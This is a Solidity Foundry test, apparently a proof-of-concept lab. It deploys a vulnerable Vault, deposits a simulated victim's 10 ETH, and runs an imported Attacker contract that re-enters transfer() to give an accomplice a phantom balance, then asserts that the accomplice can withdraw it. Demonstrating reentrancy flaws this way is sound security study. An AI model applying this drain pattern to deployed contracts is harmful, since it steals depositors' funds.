// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/attacker.sol";

contract VaultTest is Test {
    Vault public vault;
    Attacker public attacker;
    address victim = address(0x1);
    address accomplice = address(0x2);

    function setUp() public {
        // Deploy the Vulnerable Vault contract
        vault = new Vault();

        // Simulate a victim who deposits 10 ETH into the vault
        // This is the money the attacker will drain
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        // Deploy the attacker contract, wired to the vault and accomplice
        attacker = new Attacker(vault, accomplice);

        // Fund THIS test contract with 1 ETH so it can call attack{value: 1 ether}
        // (msg.value in attack() comes from the caller, which is this contract)
        vm.deal(address(this), 1 ether);
    }

    function testCrossFunctionDrain() public {
        // kick off the attack by calling attack() on the attacker contract, sending 1 ETH
        // and during the callback re-enters transfer() to move its
        // still-inflated balance to the accomplice
        attacker.attack{value: 1 ether}();

        // Assertion 1: the phantom credit exists
        // Accomplice never deposited, but the vault ledger shows them holding 1 ETH
        assertEq(vault.balances(accomplice), 1 ether);

        // Assertion 2: the credit is real ETH — accomplice can withdraw it
        // This is the drain being realized: 1 ETH out of the vault, funded by victim
        vm.prank(accomplice);
        vault.withdraw();
        assertEq(accomplice.balance, 1 ether);
    }
}
